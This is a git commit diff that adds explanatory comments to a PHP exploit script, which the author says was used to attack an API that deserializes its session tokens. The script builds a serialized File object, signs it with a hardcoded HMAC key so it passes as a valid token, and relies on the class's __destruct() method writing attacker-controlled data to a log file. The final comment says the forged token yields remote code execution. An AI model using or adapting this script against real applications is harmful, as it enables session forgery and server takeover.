732d11abe9c3743c3da06a2b95b23472d1e38d79
Ayman <ayman6nossir@gmail.com>
2022-09-04 23:51:53 +0200

    add a script i used from exploiting an insecure deserialization in php

--- insecure_desrialization.php
+++ insecure_desrialization.php
@@ -1,5 +1,10 @@
 <?php  
 
+//After exploiting another vulnerability, i was able to recover the source code of the API which showed that the API deserilizes the session token in order to indentify the user.
+// The code also that the class File uses the trompoline  function __destruct() to write the variable $uuid in the file $logfile 
+// This is the script i used for exploiting the insecure deserialization in PHP.
+
+
 define('KEY', "ooghie1Z Fae8aish OhT3fie6 Gae2aiza"); 
 function sign($data) {   return hash_hmac('md5', $data, KEY); }
 
@@ -16,5 +21,7 @@ class File
 }
 
 echo tokenize(new File());
+
+// Now, we can use the generated value as the sesion token to get RCE.
 
 ?>
